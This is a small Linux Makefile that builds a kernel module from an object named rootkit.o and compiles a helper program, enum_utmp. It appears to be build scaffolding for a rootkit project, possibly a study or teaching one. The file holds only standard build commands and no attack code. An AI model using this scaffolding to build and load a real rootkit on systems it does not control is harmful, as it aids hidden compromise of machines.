obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	gcc -o enum_utmp enum_utmp.c

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm enum_utmp
